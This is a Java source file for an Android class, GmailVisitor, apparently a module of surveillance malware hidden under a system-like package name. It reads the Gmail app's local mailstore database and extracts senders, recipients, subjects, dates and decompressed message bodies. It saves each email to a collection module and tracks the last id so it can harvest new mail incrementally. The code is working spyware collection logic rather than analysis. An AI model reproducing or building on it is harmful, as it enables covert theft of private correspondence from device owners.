package com.android.networking.module;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.zip.GZIPInputStream;
import java.util.zip.InflaterInputStream;

import android.database.Cursor;

import com.android.networking.auto.Cfg;
import com.android.networking.db.RecordVisitor;
import com.android.networking.module.email.Email;
import com.android.networking.util.Check;
import com.android.networking.util.StringUtils;

public class GmailVisitor extends RecordVisitor {
	private static final String TAG = "GmailVisitor";
	boolean initialized = false;
	private ModuleMessage moduleMessage;
	private String mailstore;
	public String[] projection = new String[] { "_id", "fromAddress", "toAddresses", "ccAddresses", "bccAddresses", // 4
			"bodyCompressed", "dateSentMs", "subject", "snippet", "bodyEmbedsExternalResources", // 9
			"joinedAttachmentInfos" };

	public String selection = "_id > ";
	public int lastId;
	private String from;
	private boolean requestStop;

	public GmailVisitor(ModuleMessage moduleMessage, String mailstore) {
		this.moduleMessage = moduleMessage;
		this.from = mailstore.substring("mailstore.".length(), mailstore.length() - ".db".length());
		this.mailstore = mailstore;
	}

	public static String decompress(byte[] compressed) throws IOException {
		// byte[] compressed = StringUtils.hexStringToByteArray(zipText);

		InflaterInputStream gzipInputStream = new InflaterInputStream(new ByteArrayInputStream(compressed, 0,
				compressed.length));

		ByteArrayOutputStream baos = new ByteArrayOutputStream();

		byte b[] = new byte[1024];
		while (true) {
			int l = gzipInputStream.read(b, 0, 1024);
			if (l == -1) {
				break;
			}
			baos.write(b, 0, l);
		}

		gzipInputStream.close();
		baos.close();
		String sReturn = new String(baos.toByteArray(), "UTF-8");
		return sReturn;

	}

	@Override
	public int cursor(Cursor cursor) {
		initialize(cursor);
		// extract messages

		int id = cursor.getInt(0);
		String fromAddress = cursor.getString(1);
		String toAddresses = cursor.getString(2);
		String ccAddresses = cursor.getString(3);
		byte[] bodyCompressed = cursor.getBlob(5);
		Date timestamp = new Date(cursor.getLong(6));
		String subject = cursor.getString(7);
		String snippet = cursor.getString(8);

		String body = snippet;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (cursor), _id=" + id + " from=" + fromAddress + " to= " + toAddresses);
		}

		try {
			if (bodyCompressed != null) {
				body = decompress(bodyCompressed);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (cursor) Error: " + e);
			}
		}

		boolean incoming = fromAddress.contains(from);
		Email m = new Email(incoming, timestamp, fromAddress, toAddresses, ccAddresses, body, snippet, subject);
		moduleMessage.saveEmail(m);
		moduleMessage.updateMarkupMail(mailstore, id, false);

		return id;
	}

	private void initialize(Cursor cursor) {
		if (initialized)
			return;

		initialized = true;
	}

	@Override
	public String[] getProjection() {
		return projection;
	}

	@Override
	public String getSelection() {
		return selection + lastId;
	}

	@Override
	public boolean isStopRequested() {
		return moduleMessage.isStopRequested();
	}

}
